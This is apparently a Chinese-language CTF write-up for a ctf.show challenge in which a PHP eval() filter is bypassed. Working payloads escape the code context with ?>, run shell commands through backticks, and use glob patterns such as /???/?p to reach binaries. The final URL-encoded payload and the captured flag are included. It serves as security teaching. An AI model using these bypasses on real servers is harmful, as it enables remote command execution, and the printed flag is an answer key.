## 问题背景

题目地址：`https://f6d0535f-de40-43f3-a5d0-3f4c63dca552.challenge.ctf.show/`

页面标题为 `ctf.show_红包题`，首页源码里给出提示：

```html
<!-- hint:?cmd= -->
```

访问 `?cmd=id` 后页面会先 `highlight_file(__FILE__)` 泄露源码，再返回 `cerror`。泄露出的关键 PHP 逻辑如下：

```php
if(isset($_GET['cmd'])){
    $cmd=$_GET['cmd'];
    highlight_file(__FILE__);
    if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){
        die("cerror");
    }
    if(preg_match("/\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){
        die("serror");
    }
    eval($cmd);
}
```

> [!note]
> 这是一个 PHP `eval($cmd)` 代码执行题，但过滤非常强：几乎所有字母、数字和很多特殊字符都被拦截。

## 解决过程

### 1. 分析过滤规则

第一条正则：

```regex
/[A-Za-oq-z0-9$]+/
```

含义：

- 禁止大写字母 `A-Z`
- 禁止小写字母 `a-o` 和 `q-z`
- 禁止数字 `0-9`
- 禁止 `$`
- 唯一漏掉的小写字母是 `p`

第二条正则禁止了很多符号，但没有禁止这些关键字符：

```text
? / . 空格 ` < > = ;
```

这意味着仍然可以构造：

- PHP 闭合标签 `?>`
- PHP 短输出标签 `<?= ... ?>`
- 反引号命令执行 `` `command` ``
- shell 通配符 `?`
- 路径分隔符 `/`
- 当前目录 `.`

### 2. 关键绕过：跳出 eval 再使用反引号

`eval($cmd)` 执行的是 PHP 代码。由于 `?>` 没有被过滤，可以先跳出 PHP 代码上下文：

```php
?><?=`命令`;?>
```

在 PHP 中，反引号等价于 shell_exec 风格的命令执行，`<?= ... ?>` 会把结果输出到页面。

由于普通命令名不能直接写字母，需要用 shell 通配符 `?` 来匹配命令路径。

### 3. 验证命令执行

使用 payload：

```php
?><?=`/???/p??`;?>
```

其中 `/???/p??` 可以匹配 `/bin/pwd`，页面返回：

```text
/var/www/html
```

说明反引号命令执行成功。

### 4. 用 ps 做低频路径枚举

因为直接写 `ls`、`cat` 都会被过滤，可以利用 `/bin/ps` 显示当前进程参数，从而观察 shell 通配符展开结果。

payload 形态：

```php
?><?=`/???/p? /????????`;?>
```

其中：

- `/???/p?` 匹配 `/bin/ps`
- `/????????` 匹配根目录下长度为 8 的路径

返回进程参数中出现：

```text
/bin/ps /flag.txt
```

确认 flag 文件位于：

```text
/flag.txt
```

### 5. 复制 flag 到 Web 目录读取

由于 `cat` 的匹配不稳定，最终使用 `cp` 把 `/flag.txt` 复制到当前 Web 目录。

最终 payload：

```php
?><?=`/???/?p /???????? ./p`;?>
```

解释：

```bash
/bin/cp /flag.txt ./p
```

通配符对应关系：

| payload 片段 | 实际匹配 |
|---|---|
| `/???/?p` | `/bin/cp` |
| `/????????` | `/flag.txt` |
| `./p` | Web 目录下的 `p` 文件 |

执行后访问：

```text
/p
```

得到：

```text
ctfshow{250eaa83-47bc-4135-a531-073e13c8732e}
```

## 核心结论

最终 flag：

```text
ctfshow{250eaa83-47bc-4135-a531-073e13c8732e}
```

最终可用 URL 编码 payload：

```text
/?cmd=%3F%3E%3C%3F%3D%60%2F%3F%3F%3F%2F%3Fp%20%2F%3F%3F%3F%3F%3F%3F%3F%3F%20.%2Fp%60%3B%3F%3E
```

随后访问：

```text
/p
```

## 延伸思考

### eval 过滤题的突破点

遇到 PHP `eval` 强过滤题时，不要只盯着函数名拼接。可以优先检查：

1. 是否能用 `?>` 跳出 PHP 代码块；
2. 是否能用短标签 `<?= ... ?>` 输出结果；
3. 是否能用反引号执行命令；
4. 是否能用 shell 通配符 `?`、`*` 间接构造命令；
5. 是否存在某个漏网字母，例如本题的 `p`。

### shell 通配符的价值

当字母被过滤时，shell glob 可以绕过显式命令名：

```bash
/???/p??
```

可能匹配：

```text
/bin/pwd
/bin/php
/bin/pip
```

命令是否可用取决于 shell 展开后的第一个匹配项和命令参数行为。需要通过低频请求逐步验证，避免对题目服务造成压力。

### ps 的枚举技巧

`ps` 不一定能读取文件内容，但它会展示当前命令行参数。因此可以用它观察 glob 展开结果：

```bash
/bin/ps /????????
```

如果参数被 shell 展开，就能在 `ps` 输出里看到类似：

```text
/bin/ps /flag.txt
```

这是一种低破坏性的路径确认方法。

## 待验证

- [待验证] 不同镜像中 `/???/?p`、`/???/p??` 等 glob 的第一个匹配结果可能不同；本题环境中分别可用于匹配 `/bin/cp`、`/bin/pwd`。
- [待验证] 如果目标禁用 PHP 短标签或反引号执行，本解法需要改为其它 PHP 输出/执行原语。
